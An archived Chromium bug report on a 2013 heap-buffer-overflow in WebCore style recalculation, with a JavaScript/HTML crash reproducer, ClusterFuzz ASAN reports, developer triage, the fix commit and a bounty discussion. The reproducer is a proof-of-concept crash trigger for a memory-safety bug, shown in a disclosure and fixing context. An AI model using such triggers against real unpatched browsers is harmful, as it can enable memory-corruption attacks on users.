# Heap-buffer-overflow in WebCore::Element::recalcStyle

| Field | Value |
|-------|-------|
| **Issue ID** | [40077985](https://issues.chromium.org/issues/40077985) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ad...@chromium.org |
| **Created** | 2013-08-25 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

This bug is similar to <https://code.google.com/p/chromium/issues/detail?id=260375>  

which is fixed now.

The following testcase crash the ASAN chrome build.

**VERSION**  

Chrome Version: asan-symbolized-linux-release-219161  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<script>
function start() {
o0=document.createElement('iframe');
document.getElementById('store\_div').appendChild(o0);
o1=document.createElement('iframe');
document.getElementById('store\_div').appendChild(o1);
o3=document.createElement('iframe');
document.getElementById('store\_div').appendChild(o3);
window.setTimeout('startrly()', 100);
}
function startrly() {
o18=document.createElement('footer');
o41=o1.contentDocument;
o42=o3.contentDocument;
o43=o42.documentElement;
o56=document.createElement('iframe');
o0.appendChild(o56);
window.setTimeout('window.top.start\_dyniframe0()',100);
}
function start\_dyniframe0() {
o96=o56.contentWindow;
o96.ondeviceorientation=cb\_ondeviceorientation\_233\_1;
o96.onpagehide=window.top.cb\_onpagehide\_244\_1;
}
function cb\_ondeviceorientation\_233\_1() {
o41.documentElement.appendChild(o56);
o18.appendChild(o56);
}
function cb\_onpagehide\_244\_1() {
o43.firstChild.appendChild(o56.parentNode);
o56.src='javascript:void';
}
</script>
<body onload="start()"><div id="store\_div"></div></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: see attached stack.txt for ASAN output

## Attachments

- [stack.txt](attachments/stack.txt) (text/plain; charset=us-ascii, 10.7 KB)
- [test.html](attachments/test.html) (text/plain; charset=us-ascii, 652 B)
- [test.html](attachments/test_53423010.html) (text/html; charset=us-ascii, 478 B)

## Timeline

### cl...@chromium.org (2013-08-25)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=5402193289019392

### in...@chromium.org (2013-08-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-08-25)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5402193289019392

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x60e0000258bf
Crash State:
  - crash stack -
  WebCore::Element::recalcStyle
  WebCore::Document::recalcStyle
  WebCore::Document::updateStyleIfNeeded
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=178833:178899

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94tkDjAY3cx-beLqPH4iYRQ_fJsbLyi9l043C46G1HYrld6NfLNJE1vWPObZ1mJk8xLnn9cemFVKnip90cYriW1JL1QQEi6LSWaARcjjm5UD0WsL9ELY2CPf_-hVNg0g7gnuhiJBoUUyS5sX2dyuzDmd5fcFQ



### in...@chromium.org (2013-08-25)

[Empty comment from Monorail migration]

### ad...@chromium.org (2013-08-26)

This sounds very similar to https://crbug.com/chromium/260375. Perhaps merging http://src.chromium.org/viewvc/blink?view=revision&revision=156174 would be sufficient to fix it. I was expecting the security team to merge that revision (as it's marked merge-approved); was I supposed to do it?

### in...@chromium.org (2013-08-26)

Adam, this is found on chromium trunk, so it still reproduces after your fix in 260375. As a side note, we will merge the fix for 260375 to appropriate branches when merge window opens.

### ad...@chromium.org (2013-08-26)

@inferno, yeah, just reproduced with a recent ASAN build. Will dig into this now.

### ad...@chromium.org (2013-08-26)

This test case crashes in a Debug build with an ASSERT(hasRareData()), as we're trying to decrement the subframe count for a node with no subframe count.

Attached a slightly cleaner test case, though I still doubt it's minimal. One thing to note is that the "pagehide" listener works just as well with an "unload" listener.

### ad...@chromium.org (2013-08-26)

Further minimized the test case to get rid of deviceorientation (and get rid of unnecessary subframes). I suspect the bug is that setting iframe.src causes a frame to be created despite the existence on the stack of the SubframeLoadDisabler.

### ad...@chromium.org (2013-08-26)

Fix up at https://codereview.chromium.org/23461004

### bu...@chromium.org (2013-08-27)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=156744

------------------------------------------------------------------------
r156744 | adamk@chromium.org | 2013-08-27T01:43:17.620564Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/frames/set-iframe-src-in-pagehide-crash-expected.txt?r1=156744&r2=156743&pathrev=156744
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/html/HTMLFrameOwnerElement.cpp?r1=156744&r2=156743&pathrev=156744
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/frames/set-iframe-src-in-pagehide-crash.html?r1=156744&r2=156743&pathrev=156744

HTMLFrameOwnerElement should obey the SubframeLoadingDisabler when creating subframes

R=abarth, esprehn
BUG=278912

Review URL: https://chromiumcodereview.appspot.com/23461004
------------------------------------------------------------------------

### in...@chromium.org (2013-08-27)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-08-27)

ClusterFuzz has detected this issue as fixed in range 219711:219724.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5402193289019392

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-buffer-overflow READ 4
Crash Address: 0x60e0000258bf
Crash State:
  - crash stack -
  WebCore::Element::recalcStyle
  WebCore::Document::recalcStyle
  WebCore::Document::updateStyleIfNeeded
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=178833:178899
Fixed: https://cluster-fuzz.appspot.com/revisions?range=219711:219724

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94tkDjAY3cx-beLqPH4iYRQ_fJsbLyi9l043C46G1HYrld6NfLNJE1vWPObZ1mJk8xLnn9cemFVKnip90cYriW1JL1QQEi6LSWaARcjjm5UD0WsL9ELY2CPf_-hVNg0g7gnuhiJBoUUyS5sX2dyuzDmd5fcFQ

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### ka...@google.com (2013-09-03)

i merged this.

### bu...@chromium.org (2013-09-03)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=157168

------------------------------------------------------------------------
r157168 | karen@chromium.org | 2013-09-03T23:08:49.487082Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/1599/LayoutTests/fast/frames/set-iframe-src-in-pagehide-crash-expected.txt?r1=157168&r2=157167&pathrev=157168
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/core/html/HTMLFrameOwnerElement.cpp?r1=157168&r2=157167&pathrev=157168
   A http://src.chromium.org/viewvc/blink/branches/chromium/1599/LayoutTests/fast/frames/set-iframe-src-in-pagehide-crash.html?r1=157168&r2=157167&pathrev=157168

Merge 156744 "HTMLFrameOwnerElement should obey the SubframeLoad..."

> HTMLFrameOwnerElement should obey the SubframeLoadingDisabler when creating subframes
> 
> R=abarth, esprehn
> BUG=278912
> 
> Review URL: https://chromiumcodereview.appspot.com/23461004

TBR=adamk@chromium.org

Review URL: https://codereview.chromium.org/23875006
------------------------------------------------------------------------

### in...@chromium.org (2013-09-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-25)

Did you saw our new criteria for possibly issuing higher rewards? See http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program/reward-nomination-process
E.g. If you are able to provide a repro that faulted at an address of 0x41414141, it will qualify for the new higher rewards. Or, if you can show that you have control between free and crash points, etc.

### in...@chromium.org (2013-09-26)

Removing incorrect Release-0 which is reserved for bugs impacting stable.

### sc...@gmail.com (2013-09-28)

$2000; possible control via pagehide handler?

### pa...@chromium.org (2013-10-18)

OK, kicked off payment for this one (and the rest). Expect something in a few weeks. Thanks again cloudfuzzer :)

### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/278912?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077985)*
